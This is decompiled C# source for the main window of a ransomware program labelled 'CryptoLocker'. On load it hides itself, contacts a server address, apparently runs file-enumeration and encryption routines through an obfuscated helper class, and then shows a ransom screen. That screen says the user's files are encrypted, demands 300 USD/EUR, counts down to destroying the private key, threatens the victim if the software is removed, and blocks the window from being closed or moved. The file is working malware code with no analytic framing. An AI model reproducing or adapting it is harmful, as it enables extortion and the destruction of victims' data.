using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Final;

public class Form1 : Form
{
	private GClass0 gclass0_0 = new GClass0();

	private Mutex mutex_0;

	private Mutex mutex_1;

	private string string_0;

	private Timer timer_0 = new Timer();

	private IContainer icontainer_0;

	private PictureBox pictureBox1;

	private Label label2;

	private Label label3;

	private Label label5;

	private Label label6;

	private Label label7;

	private Label label8;

	private Label label9;

	private Label label10;

	private Button button1;

	private Timer timer_1;

	private Label label11;

	private Label label12;

	private Label label13;

	private Label label14;

	private Label label16;

	private Label label1;

	private Panel panel1;

	private Label label18;

	private Label label4;

	private Label label15;

	private Label label17;

	private Label label22;

	private Label label23;

	private Label label24;

	private Label label25;

	private Label label26;

	private Label label21;

	private Label label20;

	private Label label19;

	private ListView listView1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public Form1()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		InitializeComponent();
	}

	protected override void WndProc(ref Message m)
	{
		if ((((Message)(ref m)).get_Msg() != 274 || ((Message)(ref m)).get_WParam().ToInt32() != 61456) && (((Message)(ref m)).get_Msg() != 161 || ((Message)(ref m)).get_WParam().ToInt32() != 2))
		{
			((Form)this).WndProc(ref m);
		}
	}

	private void method_0()
	{
		string[] array = gclass0_0.method_20();
		foreach (string text in array)
		{
			listView1.get_Items().Add(text);
		}
		((Control)listView1).set_Visible(true);
		((Control)listView1).BringToFront();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		List<string> list_ = new List<string>();
		try
		{
			gclass0_0.method_1();
			string_0 = "http://" + gclass0_0.method_4() + "/";
		}
		catch (Exception)
		{
		}
		((Control)this).Hide();
		if (gclass0_0.method_12(string_0))
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				gclass0_0.method_3();
			});
			thread.Start();
		}
		mutex_1 = new Mutex();
		mutex_0 = new Mutex(initiallyOwned: false, "CryptoLocker");
		if (!gclass0_0.method_12(string_0))
		{
			return;
		}
		try
		{
			mutex_1.WaitOne();
			if (gclass0_0.method_2(string_0, 1) || gclass0_0.method_2(string_0, 0))
			{
				foreach (string item in gclass0_0.method_5())
				{
					gclass0_0.method_19(list_, item);
				}
			}
			gclass0_0.method_15(string_0);
			mutex_1.ReleaseMutex();
		}
		catch (Exception)
		{
		}
		try
		{
			mutex_0.WaitOne();
			mutex_1.WaitOne();
		}
		catch (AbandonedMutexException)
		{
		}
		((Control)this).Show();
		try
		{
			gclass0_0.method_11(string_0);
			gclass0_0.method_10();
		}
		catch (Exception)
		{
		}
		gclass0_0.dateTime_0 = DateTime.Now.AddSeconds(gclass0_0.int_0);
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)timer_1_Tick);
		timer_0.Start();
		((Control)label3).set_Text(gclass0_0.dateTime_0.ToString());
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		gclass0_0.int_0--;
		TimeSpan timeSpan = TimeSpan.FromSeconds(gclass0_0.int_0);
		if (gclass0_0.int_0 < 0)
		{
			timer_0.Stop();
			return;
		}
		((Control)label25).set_Text(timeSpan.Days.ToString());
		((Control)label6).set_Text(timeSpan.Hours.ToString());
		((Control)label8).set_Text(timeSpan.Minutes.ToString());
		((Control)label10).set_Text(timeSpan.Seconds.ToString());
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Control)button1).set_Enabled(false);
		if (gclass0_0.method_2(string_0, 4))
		{
			Form4 form = new Form4();
			((Control)form).Show();
		}
		else if (gclass0_0.method_2(string_0, 3))
		{
			Form3 form2 = new Form3();
			((Control)form2).Show();
		}
		else
		{
			Form2 form3 = new Form2();
			((Control)form3).Show();
		}
		((Control)this).Hide();
	}

	private void label19_Click(object sender, EventArgs e)
	{
		method_0();
	}

	private void listView1_Click(object sender, EventArgs e)
	{
		((Control)listView1).set_Visible(false);
	}

	private void Form1_Click(object sender, EventArgs e)
	{
		((Control)listView1).set_Visible(false);
	}

	private void listView1_MouseClick(object sender, MouseEventArgs e)
	{
		((Control)listView1).set_Visible(false);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_0351: Unknown result type (might be due to invalid IL or missing references)
		//IL_035b: Expected O, but got Unknown
		//IL_03e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03eb: Expected O, but got Unknown
		//IL_0471: Unknown result type (might be due to invalid IL or missing references)
		//IL_047b: Expected O, but got Unknown
		//IL_0504: Unknown result type (might be due to invalid IL or missing references)
		//IL_050e: Expected O, but got Unknown
		//IL_0598: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a2: Expected O, but got Unknown
		//IL_062c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0636: Expected O, but got Unknown
		//IL_06e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06eb: Expected O, but got Unknown
		//IL_07c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07cc: Expected O, but got Unknown
		//IL_0842: Unknown result type (might be due to invalid IL or missing references)
		//IL_084c: Expected O, but got Unknown
		//IL_08c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08cf: Expected O, but got Unknown
		//IL_0948: Unknown result type (might be due to invalid IL or missing references)
		//IL_0952: Expected O, but got Unknown
		//IL_09cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d5: Expected O, but got Unknown
		//IL_0a3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a48: Expected O, but got Unknown
		//IL_0c0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c15: Expected O, but got Unknown
		//IL_0c9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ca9: Expected O, but got Unknown
		//IL_0d37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d41: Expected O, but got Unknown
		//IL_0dcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd5: Expected O, but got Unknown
		//IL_0e4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e59: Expected O, but got Unknown
		//IL_0ed0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eda: Expected O, but got Unknown
		//IL_0f53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f5d: Expected O, but got Unknown
		//IL_0fd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe0: Expected O, but got Unknown
		//IL_105f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1069: Expected O, but got Unknown
		//IL_10df: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e9: Expected O, but got Unknown
		//IL_1153: Unknown result type (might be due to invalid IL or missing references)
		//IL_115d: Expected O, but got Unknown
		//IL_11d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_11e3: Expected O, but got Unknown
		//IL_124a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1254: Expected O, but got Unknown
		//IL_12db: Unknown result type (might be due to invalid IL or missing references)
		//IL_12e5: Expected O, but got Unknown
		//IL_14fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1505: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		pictureBox1 = new PictureBox();
		label2 = new Label();
		label3 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		label9 = new Label();
		label10 = new Label();
		button1 = new Button();
		timer_1 = new Timer(icontainer_0);
		label11 = new Label();
		label12 = new Label();
		label13 = new Label();
		label14 = new Label();
		label16 = new Label();
		label1 = new Label();
		panel1 = new Panel();
		label20 = new Label();
		label19 = new Label();
		label24 = new Label();
		label23 = new Label();
		label22 = new Label();
		label17 = new Label();
		label15 = new Label();
		label21 = new Label();
		label18 = new Label();
		label4 = new Label();
		listView1 = new ListView();
		label25 = new Label();
		label26 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		pictureBox1.set_ErrorImage((Image)null);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(12, 57));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(255, 258));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(66, 318));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(161, 14));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Private key will be destroyed on");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(84, 334));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(126, 14));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("12/13/2013 00:00:00 PM");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(120, 384));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(47, 14));
		((Control)label5).set_TabIndex(6);
		((Control)label5).set_Text("Time left");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Yellow);
		((Control)label6).set_Location(new Point(110, 400));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(34, 24));
		((Control)label6).set_TabIndex(7);
		((Control)label6).set_Text("00");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Yellow);
		((Control)label7).set_Location(new Point(140, 400));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(17, 24));
		((Control)label7).set_TabIndex(8);
		((Control)label7).set_Text(":");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Yellow);
		((Control)label8).set_Location(new Point(155, 400));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(34, 24));
		((Control)label8).set_TabIndex(9);
		((Control)label8).set_Text("00");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.Yellow);
		((Control)label9).set_Location(new Point(185, 400));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(17, 24));
		((Control)label9).set_TabIndex(10);
		((Control)label9).set_Text(":");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.Yellow);
		((Control)label10).set_Location(new Point(198, 400));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(34, 24));
		((Control)label10).set_TabIndex(11);
		((Control)label10).set_Text("00");
		((Control)button1).set_BackColor(Color.RoyalBlue);
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(566, 520));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(140, 39));
		((Control)button1).set_TabIndex(13);
		((Control)button1).set_Text("Next >>");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_BackColor(Color.White);
		((Control)label11).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_Location(new Point(364, 105));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(0, 19));
		((Control)label11).set_TabIndex(22);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_BackColor(Color.White);
		((Control)label12).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_Location(new Point(344, 135));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(0, 19));
		((Control)label12).set_TabIndex(23);
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_BackColor(Color.White);
		((Control)label13).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_Location(new Point(305, 164));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(0, 19));
		((Control)label13).set_TabIndex(24);
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_BackColor(Color.White);
		((Control)label14).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_Location(new Point(341, 192));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(0, 19));
		((Control)label14).set_TabIndex(25);
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_BackColor(Color.White);
		((Control)label16).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label16).set_Location(new Point(321, 251));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(0, 19));
		((Control)label16).set_TabIndex(27);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(310, 25));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(348, 24));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your personal files are encrypted!");
		((Control)panel1).set_BackColor(Color.White);
		((Control)panel1).get_Controls().Add((Control)(object)label20);
		((Control)panel1).get_Controls().Add((Control)(object)label19);
		((Control)panel1).get_Controls().Add((Control)(object)label24);
		((Control)panel1).get_Controls().Add((Control)(object)label23);
		((Control)panel1).get_Controls().Add((Control)(object)label22);
		((Control)panel1).get_Controls().Add((Control)(object)label17);
		((Control)panel1).get_Controls().Add((Control)(object)label15);
		((Control)panel1).get_Controls().Add((Control)(object)label21);
		((Control)panel1).get_Controls().Add((Control)(object)label18);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).set_Location(new Point(274, 57));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(432, 450));
		((Control)panel1).set_TabIndex(29);
		((Control)label20).set_AutoSize(true);
		((Control)label20).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label20).set_Location(new Point(181, 39));
		((Control)label20).set_Name("label20");
		((Control)label20).set_Size(new Size(238, 16));
		((Control)label20).set_TabIndex(13);
		((Control)label20).set_Text("is a complete list of encrypted files, and");
		((Control)label19).set_AutoSize(true);
		((Control)label19).set_Cursor(Cursors.get_Hand());
		((Control)label19).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label19).set_Location(new Point(146, 39));
		((Control)label19).set_Name("label19");
		((Control)label19).set_Size(new Size(38, 16));
		((Control)label19).set_TabIndex(12);
		((Control)label19).set_Text("HERE");
		((Control)label19).add_Click((EventHandler)label19_Click);
		((Control)label24).set_AutoSize(true);
		((Control)label24).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label24).set_ForeColor(Color.Maroon);
		((Control)label24).set_Location(new Point(12, 347));
		((Control)label24).set_Name("label24");
		((Control)label24).set_Size(new Size(368, 32));
		((Control)label24).set_TabIndex(11);
		((Control)label24).set_Text("Any attempt to remove or damage this software will lead\r\nto immediate destruction of the private key by server.");
		((Control)label23).set_AutoSize(true);
		((Control)label23).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label23).set_Location(new Point(10, 297));
		((Control)label23).set_Name("label23");
		((Control)label23).set_Size(new Size(383, 16));
		((Control)label23).set_TabIndex(10);
		((Control)label23).set_Text("Click Next>>  to select the method of payment and the currency.");
		((Control)label22).set_AutoSize(true);
		((Control)label22).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label22).set_Location(new Point(11, 251));
		((Control)label22).set_Name("label22");
		((Control)label22).set_Size(new Size(122, 16));
		((Control)label22).set_TabIndex(9);
		((Control)label22).set_Text("in another currency.");
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label17).set_Location(new Point(307, 233));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(93, 16));
		((Control)label17).set_TabIndex(8);
		((Control)label17).set_Text("similar amount");
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Font(new Font("Arial", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label15).set_Location(new Point(186, 234));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(123, 16));
		((Control)label15).set_TabIndex(7);
		((Control)label15).set_Text("300 USD / 300 EUR");
		((Control)label21).set_AutoSize(true);
		((Control)label21).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label21).set_Location(new Point(10, 57));
		((Control)label21).set_Name("label21");
		((Control)label21).set_Size(new Size(423, 208));
		((Control)label21).set_TabIndex(6);
		((Control)label21).set_Text(componentResourceManager.GetString("label21.Text"));
		((Control)label18).set_AutoSize(true);
		((Control)label18).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label18).set_Location(new Point(12, 39));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(143, 16));
		((Control)label18).set_TabIndex(3);
		((Control)label18).set_Text("video, documents, etc. ");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(11, 19));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(392, 16));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("Your important files encryption produced on this computer: photos,");
		((Control)listView1).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)listView1).set_Location(new Point(46, 52));
		((Control)listView1).set_Name("listView1");
		((Control)listView1).set_Size(new Size(612, 486));
		((Control)listView1).set_TabIndex(32);
		listView1.set_UseCompatibleStateImageBehavior(false);
		listView1.set_View((View)1);
		((Control)listView1).set_Visible(false);
		((Control)listView1).add_MouseClick(new MouseEventHandler(listView1_MouseClick));
		((Control)listView1).add_Click((EventHandler)listView1_Click);
		listView1.get_Columns().Add("Filename");
		listView1.get_Columns().get_Item(0).set_Width(512);
		((Control)label25).set_AutoSize(true);
		((Control)label25).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label25).set_ForeColor(Color.Yellow);
		((Control)label25).set_Location(new Point(54, 400));
		((Control)label25).set_Name("label25");
		((Control)label25).set_Size(new Size(34, 24));
		((Control)label25).set_TabIndex(30);
		((Control)label25).set_Text("00");
		((Control)label26).set_AutoSize(true);
		((Control)label26).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label26).set_ForeColor(Color.Yellow);
		((Control)label26).set_Location(new Point(84, 400));
		((Control)label26).set_Name("label26");
		((Control)label26).set_Size(new Size(29, 24));
		((Control)label26).set_TabIndex(31);
		((Control)label26).set_Text("d.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(721, 573));
		((Control)this).get_Controls().Add((Control)(object)listView1);
		((Control)this).get_Controls().Add((Control)(object)label26);
		((Control)this).get_Controls().Add((Control)(object)label25);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label16);
		((Control)this).get_Controls().Add((Control)(object)label14);
		((Control)this).get_Controls().Add((Control)(object)label13);
		((Control)this).get_Controls().Add((Control)(object)label12);
		((Control)this).get_Controls().Add((Control)(object)label11);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("CryptoLocker");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_Click((EventHandler)Form1_Click);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[CompilerGenerated]
	private void method_1()
	{
		gclass0_0.method_3();
	}
}
